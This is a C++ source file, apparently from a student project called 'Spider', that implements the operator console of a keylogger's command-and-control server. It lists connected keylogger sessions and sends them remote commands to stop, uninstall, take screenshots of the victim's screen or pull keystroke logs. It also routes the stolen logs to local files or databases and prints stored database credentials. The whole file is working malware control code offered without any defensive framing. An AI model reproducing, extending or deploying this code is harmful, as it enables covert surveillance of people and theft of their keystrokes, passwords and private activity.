//
// Created by baptiste on 9/28/17.
//

#include "CommandAcceptor.hpp"

bool 	CommandAcceptor::run()
{
  setMap();
  _input = "";
  for (;;)
  {
    _input.clear();
    if (_liveSessions)
      _liveSessions->erase(std::remove_if(_liveSessions->begin(), _liveSessions->end(),
					  [](boost::shared_ptr<LogSession> &session)
					  { return !(session.get())->isLive(); }),
			   _liveSessions->end());
    std::cout << "[Online: \033[1;32m" << _liveSessions->size() << "\033[0m] ?> ";
    std::getline(std::cin, _input);
    if (std::cin.eof())
      return false;
    if (!parser())
      return false;
  }
}

bool	CommandAcceptor::assignKeyloggerIfExist()
{
  auto it = std::find_if(_liveSessions->begin(), _liveSessions->end(),
			 [&](boost::shared_ptr<LogSession> &sp)
			 {
			   return *sp.get() == _splitCmd[1];
			 });
  if (it != _liveSessions->end()) {
    _targetedSession = *it;
    return true;
  }
  return false;
}

void 	CommandAcceptor::setMap()
  {
    _commandMap["list"] = [this](){listSessions();};
    _commandMap["listDB"] = [this](){listDB();};
    _commandMap["clear"] = [this](){clear();};
    _commandMap["LOCAL"] = [this](){setStorageType(STORAGE_TYPE::FILE_STORAGE);};
    _commandMap["DATABASE"] = [this](){setStorageType(STORAGE_TYPE::DATABASE_STORAGE);};
    _commandMap["ALL"] = [this](){setStorageType(STORAGE_TYPE::ALL_STORAGE);};
    _commandMap["changelocal"] = [this](){setLocalStorage();};
    _commandMap["changedatabase"] = [this](){setDatabaseStorage();};
    _commandMap["newdatabase"] = [this](){addDB();};
    _commandMap["help"] = [this](){help();};
    _commandMap["stop"] = [this](){commandSend(Packet::COMMAND_STOP);};
    _commandMap["uninstall"] = [this](){commandSend(Packet::COMMAND_UNINSTALL);};
    _commandMap["screenshot"] = [this](){commandSend(Packet::COMMAND_SCREENSHOT);};
    _commandMap["getlog"] = [this](){commandSend(Packet::COMMAND_GETLOG);};
  }

bool 	CommandAcceptor::parser()
{
  _splitCmd = boost::split(_splitCmd, _input, boost::is_any_of("\t \v"));
  _targetedSession.reset();

  auto it = _commandMap.find(_splitCmd[0]);
  if (_splitCmd.size() == 1 && _splitCmd[0] == "quit")
    return false;
  else if (!_splitCmd.size() || it == _commandMap.end())
    _commandMap["help"]();
  else if (_splitCmd.size() == 1)
      _commandMap[_splitCmd[0]]();
  else
  {
    if (assignKeyloggerIfExist())
      _commandMap[_splitCmd[0]]();
    else
      std::cout << "No matching keylogger ID found on the server\n?> " << std::endl;
  }
  return true;
}

void 	CommandAcceptor::setLocalStorage()
{
  if (_targetedSession && _splitCmd.size() == 3)
    _targetedSession->setLocalStorage(_splitCmd[2]);
  else
    help();
}

void 	CommandAcceptor::setDatabaseStorage()
{
  try {
  if (_targetedSession  && _splitCmd.size() == 3)
    _targetedSession->setDB(std::stoi(_splitCmd[2]));
  else
    help();
  } catch (const std::exception &e) {
    std::cout << "Cannot set Database " << _splitCmd[1]
	      << " : Unknown ID or invalid argument" << std::endl;
  }
}

void 	CommandAcceptor::addDB()
{
  DatabaseInfo	DBinfo;

  if (_splitCmd.size() == 7 && _targetedSession)
    try {
      DBinfo = {_splitCmd[2], std::stoi(_splitCmd[3]),
		_splitCmd[4], _splitCmd[5], _splitCmd[6]};
      _targetedSession->setDB(std::move(DBinfo));
    } catch (const std::exception &e) {
      std::cout << "Illformed arguments" << std::endl;
    }
  else
    help();
}

void 	CommandAcceptor::setStorageType(STORAGE_TYPE method)
{
  if (_targetedSession)
    _targetedSession->changeStorageMethod(method);
}

void 	CommandAcceptor::listSessions() const
{
  std::cerr << _liveSessions->size() << " keylogger(s) entry(ies) found" << std::endl;
  if (_liveSessions->size() == 0)
  {
    std::cerr << "No keylogger currently found on the server" << std::endl;
    std::cout << std::endl;
  }
  for (auto & it : *_liveSessions)
    if (it)
      std::cout << "Session id : [" << it->getId() << "]  is live" << std::endl;
}

void 	CommandAcceptor::listDB() const
{
  std::cout << _DBUsed->getDatabases().size() << " entry(ies) found :" << std::endl;
  for (auto & it : _DBUsed->getDatabases())
    std::cout << "ID : "<< it.first
	      << " | Host: " << it.second.second._host
	      << " | Port: " << it.second.second._port
	      << " | Schema: "<< it.second.second._database
	      << " | User: "<< it.second.second._user
	      << " | Password: "<< it.second.second._password
	      << std::endl;
}

void 	CommandAcceptor::commandSend(const Packet::PacketType pckType) const
{
  Packet packet;
  boost::system::error_code e;

  if (!_targetedSession) {
    std::cerr << "Illformed request or no such keylogger ID" << std::endl;
    help();
    return ;
  }
  std::cout << "Sending request ..." << std::endl;
  packet.setPacketType(pckType);
  if ((e = _targetedSession->sendRequest(std::move(packet))))
    std::cout << "Request failed : " << e.message() << std::endl;
  else
    std::cout << "Success" << std::endl;
}

void 	CommandAcceptor::clear() const
{
  std::cout << "\033[2J\033[1;1H";
}
void 	CommandAcceptor::help() const
{
  std::cout << "Spider commands available :" << std::endl;
  std::cout << "list : List all keyloggers currently connected to the server"<< std::endl;
  std::cout << "listDB : List all Database currently reachable from the server"<< std::endl;
  std::cout << "uninstall [Keylogger ID] : Uninstall the chosen keylogger" << std::endl;
  std::cout << "getlog [Keylogger ID] : Force pull log from the client" << std::endl;
  std::cout << "stop [Keylogger ID] : Stop the chosen keylogger job until next reboot" << std::endl;
  std::cout << "screenshot [Keylogger ID] : Take a screenshot of the client's current screen" << std::endl;
  std::cout << "[Storage method] [Keylogger ID] : Change the storage method of the chosen keylogger"
	    << "\nAvailable storage method : \n\t\t- LOCAL : Store keylogger's logs to previously given local path"
	    << "\n\t\t- DATABASE : Store keylogger's logs to previously given Database"
	    << "\n\t\t- ALL : Store keylogger's log with all storage method" << std::endl;
  std::cout << "changelocal [KeyloggerID] [PATH] : Change local storage directory, PATH must be a valid directory path" << std::endl;
  std::cout << "changedatabase [KeyloggerID] [DATABASE ID] : Change linked keylogger database to an existing one" << std::endl;
  std::cout << "newdatabase [KeyloggerID] [HOST] [PORT] [SCHEMA] [USER] [PASSWORD] : Add Database to the server's databases list and connect the chosen keylogger to it" << std::endl;
  std::cout << "clear : Clear terminal" << std::endl;
  std::cout << "quit : Stop the server" << std::endl;
  std::cout << "help : Show this help" << std::endl;
}